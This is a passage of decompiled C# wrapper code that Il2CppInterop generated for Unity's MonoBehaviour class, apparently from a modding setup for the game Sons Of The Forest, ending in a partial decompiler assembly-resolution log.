        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_StopCoroutine_Public_Void_IEnumerator_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
    }

    [CallerCount(82)]
    [CachedScanResults(RefRangeStart = 1718207, RefRangeEnd = 1718289, XrefRangeStart = 1718187, XrefRangeEnd = 1718207, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe void StopCoroutine([DefaultParameterValue(null)] Coroutine routine)
    {
        IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
        System.IntPtr* ptr = stackalloc System.IntPtr[1];
        *ptr = IL2CPP.Il2CppObjectBaseToPtr(routine);
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_StopCoroutine_Public_Void_Coroutine_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
    }

    [CallerCount(16)]
    [CachedScanResults(RefRangeStart = 1718293, RefRangeEnd = 1718309, XrefRangeStart = 1718289, XrefRangeEnd = 1718293, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe void StopCoroutine([DefaultParameterValue(null)] string methodName)
    {
        IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
        System.IntPtr* ptr = stackalloc System.IntPtr[1];
        *ptr = IL2CPP.ManagedStringToIl2Cpp(methodName);
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_StopCoroutine_Public_Void_String_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
    }

    [CallerCount(0)]
    [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 0, XrefRangeEnd = 0, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe void StopAllCoroutines()
    {
        IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
        System.IntPtr* param = null;
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_StopAllCoroutines_Public_Void_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)param, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
    }

    [CallerCount(0)]
    [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 1718317, XrefRangeEnd = 1718321, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe static void print([DefaultParameterValue(null)] Il2CppSystem.Object message)
    {
        System.IntPtr* ptr = stackalloc System.IntPtr[1];
        *ptr = IL2CPP.Il2CppObjectBaseToPtr(message);
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_print_Public_Static_Void_Object_0, (System.IntPtr)0, (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
    }

    [CallerCount(0)]
    [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 0, XrefRangeEnd = 0, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe static void Internal_CancelInvokeAll([DefaultParameterValue(null)] MonoBehaviour self)
    {
        System.IntPtr* ptr = stackalloc System.IntPtr[1];
        *ptr = IL2CPP.Il2CppObjectBaseToPtr(self);
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_Internal_CancelInvokeAll_Private_Static_Void_MonoBehaviour_0, (System.IntPtr)0, (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
    }

    [CallerCount(0)]
    [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 0, XrefRangeEnd = 0, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe static bool Internal_IsInvokingAll([DefaultParameterValue(null)] MonoBehaviour self)
    {
        System.IntPtr* ptr = stackalloc System.IntPtr[1];
        *ptr = IL2CPP.Il2CppObjectBaseToPtr(self);
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr obj = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_Internal_IsInvokingAll_Private_Static_Boolean_MonoBehaviour_0, (System.IntPtr)0, (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
        return *(bool*)IL2CPP.il2cpp_object_unbox(obj);
    }

    [CallerCount(158)]
    [CachedScanResults(RefRangeStart = 1718325, RefRangeEnd = 1718483, XrefRangeStart = 1718321, XrefRangeEnd = 1718325, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe static void InvokeDelayed([DefaultParameterValue(null)] MonoBehaviour self, [DefaultParameterValue(null)] string methodName, [DefaultParameterValue(null)] float time, [DefaultParameterValue(null)] float repeatRate)
    {
        System.IntPtr* ptr = stackalloc System.IntPtr[4];
        *ptr = IL2CPP.Il2CppObjectBaseToPtr(self);
        *(System.IntPtr*)((byte*)ptr + checked((nuint)1u * unchecked((nuint)sizeof(System.IntPtr)))) = IL2CPP.ManagedStringToIl2Cpp(methodName);
        *(float**)((byte*)ptr + checked((nuint)2u * unchecked((nuint)sizeof(System.IntPtr)))) = &time;
        *(float**)((byte*)ptr + checked((nuint)3u * unchecked((nuint)sizeof(System.IntPtr)))) = &repeatRate;
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_InvokeDelayed_Private_Static_Void_MonoBehaviour_String_Single_Single_0, (System.IntPtr)0, (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
    }

    [CallerCount(9)]
    [CachedScanResults(RefRangeStart = 1717608, RefRangeEnd = 1717617, XrefRangeStart = 1717608, XrefRangeEnd = 1717617, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe static void CancelInvoke([DefaultParameterValue(null)] MonoBehaviour self, [DefaultParameterValue(null)] string methodName)
    {
        System.IntPtr* ptr = stackalloc System.IntPtr[2];
        *ptr = IL2CPP.Il2CppObjectBaseToPtr(self);
        *(System.IntPtr*)((byte*)ptr + checked((nuint)1u * unchecked((nuint)sizeof(System.IntPtr)))) = IL2CPP.ManagedStringToIl2Cpp(methodName);
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_CancelInvoke_Private_Static_Void_MonoBehaviour_String_0, (System.IntPtr)0, (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
    }

    [CallerCount(0)]
    [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 0, XrefRangeEnd = 0, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe static bool IsInvoking([DefaultParameterValue(null)] MonoBehaviour self, [DefaultParameterValue(null)] string methodName)
    {
        System.IntPtr* ptr = stackalloc System.IntPtr[2];
        *ptr = IL2CPP.Il2CppObjectBaseToPtr(self);
        *(System.IntPtr*)((byte*)ptr + checked((nuint)1u * unchecked((nuint)sizeof(System.IntPtr)))) = IL2CPP.ManagedStringToIl2Cpp(methodName);
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr obj = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_IsInvoking_Private_Static_Boolean_MonoBehaviour_String_0, (System.IntPtr)0, (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
        return *(bool*)IL2CPP.il2cpp_object_unbox(obj);
    }

    [CallerCount(0)]
    [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 1718483, XrefRangeEnd = 1718487, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe static bool IsObjectMonoBehaviour([DefaultParameterValue(null)] Object obj)
    {
        System.IntPtr* ptr = stackalloc System.IntPtr[1];
        *ptr = IL2CPP.Il2CppObjectBaseToPtr(obj);
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr obj2 = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_IsObjectMonoBehaviour_Private_Static_Boolean_Object_0, (System.IntPtr)0, (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
        return *(bool*)IL2CPP.il2cpp_object_unbox(obj2);
    }

    [CallerCount(0)]
    [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 1718487, XrefRangeEnd = 1718491, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe Coroutine StartCoroutineManaged([DefaultParameterValue(null)] string methodName, [DefaultParameterValue(null)] Il2CppSystem.Object value)
    {
        IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
        System.IntPtr* ptr = stackalloc System.IntPtr[2];
        *ptr = IL2CPP.ManagedStringToIl2Cpp(methodName);
        *(System.IntPtr*)((byte*)ptr + checked((nuint)1u * unchecked((nuint)sizeof(System.IntPtr)))) = IL2CPP.Il2CppObjectBaseToPtr(value);
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_StartCoroutineManaged_Private_Coroutine_String_Object_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
        return (intPtr != (System.IntPtr)0) ? new Coroutine(intPtr) : null;
    }

    [CallerCount(0)]
    [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 1718491, XrefRangeEnd = 1718495, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe Coroutine StartCoroutineManaged2([DefaultParameterValue(null)] IEnumerator enumerator)
    {
        IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
        System.IntPtr* ptr = stackalloc System.IntPtr[1];
        *ptr = IL2CPP.Il2CppObjectBaseToPtr(enumerator);
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_StartCoroutineManaged2_Private_Coroutine_IEnumerator_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
        return (intPtr != (System.IntPtr)0) ? new Coroutine(intPtr) : null;
    }

    [CallerCount(0)]
    [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 1718495, XrefRangeEnd = 1718499, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe void StopCoroutineManaged([DefaultParameterValue(null)] Coroutine routine)
    {
        IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
        System.IntPtr* ptr = stackalloc System.IntPtr[1];
        *ptr = IL2CPP.Il2CppObjectBaseToPtr(routine);
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_StopCoroutineManaged_Private_Void_Coroutine_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
    }

    [CallerCount(0)]
    [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 1718499, XrefRangeEnd = 1718503, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe void StopCoroutineFromEnumeratorManaged([DefaultParameterValue(null)] IEnumerator routine)
    {
        IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
        System.IntPtr* ptr = stackalloc System.IntPtr[1];
        *ptr = IL2CPP.Il2CppObjectBaseToPtr(routine);
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_StopCoroutineFromEnumeratorManaged_Private_Void_IEnumerator_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
    }

    [CallerCount(0)]
    [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 1718503, XrefRangeEnd = 1718507, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe string GetScriptClassName()
    {
        IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
        System.IntPtr* param = null;
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr il2CppString = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_GetScriptClassName_Internal_String_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)param, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
        return IL2CPP.Il2CppStringToManaged(il2CppString);
    }

    [CallerCount(0)]
    [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 1718507, XrefRangeEnd = 1718511, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe void OnCancellationTokenCreated()
    {
        IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
        System.IntPtr* param = null;
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_OnCancellationTokenCreated_Private_Void_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)param, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
    }

    [CallerCount(0)]
    [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 0, XrefRangeEnd = 0, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe MonoBehaviour()
        : this(IL2CPP.il2cpp_object_new(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr))
    {
        System.IntPtr* param = null;
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr__ctor_Public_Void_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)param, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
    }

    static MonoBehaviour()
    {
        Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr = IL2CPP.GetIl2CppClass(""UnityEngine.CoreModule.dll"", ""UnityEngine"", ""MonoBehaviour"");
        IL2CPP.il2cpp_runtime_class_init(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr);
        NativeFieldInfoPtr_m_CancellationTokenSource = IL2CPP.GetIl2CppField(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, ""m_CancellationTokenSource"");
        NativeMethodInfoPtr_get_destroyCancellationToken_Public_get_CancellationToken_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667179);
        NativeMethodInfoPtr_RaiseCancellation_Private_Void_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667180);
        NativeMethodInfoPtr_IsInvoking_Public_Boolean_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667181);
        NativeMethodInfoPtr_CancelInvoke_Public_Void_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667182);
        NativeMethodInfoPtr_Invoke_Public_Void_String_Single_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667183);
        NativeMethodInfoPtr_InvokeRepeating_Public_Void_String_Single_Single_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667184);
        NativeMethodInfoPtr_CancelInvoke_Public_Void_String_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667185);
        NativeMethodInfoPtr_IsInvoking_Public_Boolean_String_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667186);
        NativeMethodInfoPtr_StartCoroutine_Public_Coroutine_String_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667187);
        NativeMethodInfoPtr_StartCoroutine_Public_Coroutine_String_Object_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667188);
        NativeMethodInfoPtr_StartCoroutine_Public_Coroutine_IEnumerator_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667189);
        NativeMethodInfoPtr_StartCoroutine_Auto_Public_Coroutine_IEnumerator_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667190);
        NativeMethodInfoPtr_StopCoroutine_Public_Void_IEnumerator_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667191);
        NativeMethodInfoPtr_StopCoroutine_Public_Void_Coroutine_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667192);
        NativeMethodInfoPtr_StopCoroutine_Public_Void_String_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667193);
        NativeMethodInfoPtr_StopAllCoroutines_Public_Void_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667194);
        NativeMethodInfoPtr_get_useGUILayout_Public_get_Boolean_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667195);
        NativeMethodInfoPtr_set_useGUILayout_Public_set_Void_Boolean_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667196);
        NativeMethodInfoPtr_print_Public_Static_Void_Object_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667197);
        NativeMethodInfoPtr_Internal_CancelInvokeAll_Private_Static_Void_MonoBehaviour_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667198);
        NativeMethodInfoPtr_Internal_IsInvokingAll_Private_Static_Boolean_MonoBehaviour_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667199);
        NativeMethodInfoPtr_InvokeDelayed_Private_Static_Void_MonoBehaviour_String_Single_Single_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667200);
        NativeMethodInfoPtr_CancelInvoke_Private_Static_Void_MonoBehaviour_String_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667201);
        NativeMethodInfoPtr_IsInvoking_Private_Static_Boolean_MonoBehaviour_String_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667202);
        NativeMethodInfoPtr_IsObjectMonoBehaviour_Private_Static_Boolean_Object_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667203);
        NativeMethodInfoPtr_StartCoroutineManaged_Private_Coroutine_String_Object_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667204);
        NativeMethodInfoPtr_StartCoroutineManaged2_Private_Coroutine_IEnumerator_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667205);
        NativeMethodInfoPtr_StopCoroutineManaged_Private_Void_Coroutine_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667206);
        NativeMethodInfoPtr_StopCoroutineFromEnumeratorManaged_Private_Void_IEnumerator_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667207);
        NativeMethodInfoPtr_GetScriptClassName_Internal_String_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667208);
        NativeMethodInfoPtr_OnCancellationTokenCreated_Private_Void_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667209);
        NativeMethodInfoPtr__ctor_Public_Void_0 = IL2CPP.GetIl2CppMethodByToken(Il2CppClassPointerStore<MonoBehaviour>.NativeClassPtr, 100667210);
    }

    public MonoBehaviour(System.IntPtr pointer)
        : base(pointer)
    {
    }
}
#if false // Decompilation log
'183' items in cache
------------------
Resolve: 'mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
Found single assembly: 'mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\mscorlib.dll'
------------------
Resolve: 'Il2CppInterop.Runtime, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null'
Found single assembly: 'Il2CppInterop.Runtime, Version=0.7.1.0, Culture=neutral, PublicKeyToken=null'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '0.7.1.0'
Load from: 'D:\Steam\steamapps\common\Sons Of The Forest\_RedLoader\net6\Il2CppInterop.Runtime.dll'
------------------
Resolve: 'Il2CppInterop.Common, Version=0.7.1.0, Culture=neutral, PublicKeyToken=null'
Found single assembly: 'Il2CppInterop.Common, Version=0.7.1.0, Culture=neutral, PublicKeyToken=null'
Load from: 'D:\Steam\steamapps\common\Sons Of The Forest\_RedLoader\net6\Il2CppInterop.Common.dll'
------------------
Resolve: 'Il2Cppmscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=null'
Found single assembly: 'Il2Cppmscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=null'
Load from: 'D:\Steam\steamapps\common\Sons Of The Forest\_RedLoader\Game\Il2Cppmscorlib.dll'
------------------
Resolve: 'netstandard, Version=2.1.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51'
Found single assembly: 'netstandard, Version=2.1.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\netstandard.dll'
------------------
Resolve: 'UnityEngine.CoreModule, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null'
Found single assembly: 'UnityEngine.CoreModule, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null'
Load from: 'D:\Steam\steamapps\common\Sons Of The Forest\_RedLoader\Game\UnityEngine.CoreModule.dll'
------------------
Resolve: 'UnityEngine.SharedInternalsModule, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null'
Could not find by name: 'UnityEngine.SharedInternalsModule, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null'
------------------
Resolve: 'Microsoft.Win32.Registry, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'Microsoft.Win32.Registry, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\Microsoft.Win32.Registry.dll'
------------------
Resolve: 'System.Runtime, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Runtime, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Runtime.dll'
------------------
Resolve: 'System.Security.Principal.Windows, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Security.Principal.Windows, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Security.Principal.Windows.dll'
------------------
Resolve: 'System.Security.Permissions, Version=0.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51'
Could not find by name: 'System.Security.Permissions, Version=0.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51'
------------------
Resolve: 'System.Collections, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Collections, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Collections.dll'
------------------
Resolve: 'System.Collections.NonGeneric, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Collections.NonGeneric, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Collections.NonGeneric.dll'
------------------
Resolve: 'System.Collections.Concurrent, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Collections.Concurrent, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Collections.Concurrent.dll'
------------------
Resolve: 'System.ObjectModel, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.ObjectModel, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.ObjectModel.dll'
------------------
Resolve: 'System.Console, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Console, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Console.dll'
------------------
Resolve: 'System.Runtime.InteropServices, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Runtime.InteropServices, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Runtime.InteropServices.dll'
------------------
Resolve: 'System.Diagnostics.Contracts, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Diagnostics.Contracts, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Diagnostics.Contracts.dll'
------------------
Resolve: 'System.Diagnostics.StackTrace, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Diagnostics.StackTrace, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
WARN: Version mismatch. Expected: '0.0.0.0', Got: '6.0.0.0'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Diagnostics.StackTrace.dll'
------------------
Resolve: 'System.Diagnostics.Tracing, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
